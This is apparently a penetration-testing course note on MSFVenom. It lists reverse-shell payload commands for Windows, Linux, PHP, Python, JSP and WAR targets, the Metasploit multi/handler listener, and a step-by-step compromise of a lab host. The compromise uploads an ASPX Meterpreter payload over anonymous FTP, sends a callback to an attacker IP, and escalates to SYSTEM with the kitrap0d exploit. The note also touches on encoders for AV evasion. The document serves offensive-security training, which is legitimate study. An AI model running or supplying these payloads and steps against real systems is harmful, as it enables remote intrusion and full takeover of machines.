# 13 — Introduction to MSFVenom

## Overview

**MSFVenom** is the combined successor of `msfpayload` and `msfencode`. It generates customized payloads in various formats for different architectures and platforms, with optional encoding to remove bad characters and (limited) AV evasion.

---

## MSFVenom Syntax

```bash
msfvenom -p <payload> [options] -f <format> -o <output_file>
```

### Core Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-p` | Payload to use | `-p windows/meterpreter/reverse_tcp` |
| `-f` | Output format | `-f aspx`, `-f exe`, `-f elf`, `-f raw` |
| `-o` | Output file | `-o reverse_shell.aspx` |
| `-a` | Architecture | `-a x86`, `-a x64` |
| `--platform` | Target platform | `--platform windows` |
| `-e` | Encoder | `-e x86/shikata_ga_nai` |
| `-i` | Encoding iterations | `-i 10` |
| `-b` | Bad characters to avoid | `-b "\x00"` |
| `LHOST=` | Attacker IP | `LHOST=10.10.14.5` |
| `LPORT=` | Attacker port | `LPORT=1337` |

---

## Common Payload Formats

| Target | Payload | Format | Command |
|--------|---------|--------|---------|
| **Windows reverse shell** | `windows/meterpreter/reverse_tcp` | `.exe` | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe` |
| **Windows ASPX** | `windows/meterpreter/reverse_tcp` | `.aspx` | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx` |
| **Linux ELF** | `linux/x86/meterpreter/reverse_tcp` | `.elf` | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf` |
| **PHP** | `php/meterpreter/reverse_tcp` | `.php` | `msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php` |
| **Python** | `python/meterpreter/reverse_tcp` | `.py` | `msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.py` |
| **JSP** | `java/jsp_shell_reverse_tcp` | `.jsp` | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp` |
| **WAR** | `java/jsp_shell_reverse_tcp` | `.war` | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war` |

---

## Multi/Handler — Catching Reverse Shells

The **multi/handler** module is the universal listener for any MSFVenom payload.

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run
# [*] Started reverse TCP handler on 10.10.14.5:1337
```

> **Critical**: The `payload`, `LHOST`, and `LPORT` in multi/handler must **exactly match** what was used in `msfvenom`.

### Run as Background Job

```bash
msf6 exploit(multi/handler) > exploit -j
# Keeps listener running while you use the console
```

---

## Full Workflow Example: FTP + Web Upload (Devel)

### 1. Scan the Target

```bash
nmap -sV -T4 -p- 10.10.10.5
# 21/tcp  ftp   Microsoft ftpd
# 80/tcp  http  Microsoft IIS httpd 7.5
```

### 2. Discover FTP Anonymous Access + aspnet_client Directory

```bash
ftp 10.10.10.5
# Login: anonymous
ftp> ls
# aspnet_client/  ← IIS can run .aspx files
```

### 3. Generate ASPX Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

### 4. Upload via FTP

```bash
ftp> put reverse_shell.aspx
```

### 5. Start Listener

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run
```

### 6. Trigger Payload

```
Browse to: http://10.10.10.5/reverse_shell.aspx
```

### 7. Meterpreter Session Opens

```bash
meterpreter > getuid
# Server username: IIS APPPOOL\Web
```

### 8. Privilege Escalation

```bash
meterpreter > bg
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION 1
msf6 post(...) > run
# [+] exploit/windows/local/ms10_015_kitrap0d: vulnerable

msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set LPORT 1338
msf6 exploit(...) > run
meterpreter > getuid
# NT AUTHORITY\SYSTEM
```

---

## List Available Formats and Payloads

```bash
# List all output formats
msfvenom --list formats

# List all payloads
msfvenom --list payloads

# List all encoders
msfvenom --list encoders

# List payloads for a specific platform
msfvenom --list payloads | grep windows
```

---

## Key Takeaways

| Concept | Remember |
|---------|----------|
| **MSFVenom = msfpayload + msfencode** | One tool for generation + encoding |
| **multi/handler catches everything** | Universal listener — must match payload/LHOST/LPORT exactly |
| **Format matches the target** | `.aspx` for IIS, `.elf` for Linux, `.exe` for Windows, `.php` for Apache/PHP |
| **Encoding ≠ AV evasion** | Modern AV uses heuristics — encoding alone won't bypass it |
| **`local_exploit_suggester` after initial shell** | First step when you land as a low-privilege user |
| **Use different LPORT for privesc** | Original listener already bound to first port — pick a new one |
| **FTP + web = upload vector** | If FTP root maps to webroot, you can upload and trigger payloads |
| **`exploit -j` for background listeners** | Keep handler running while using other modules |
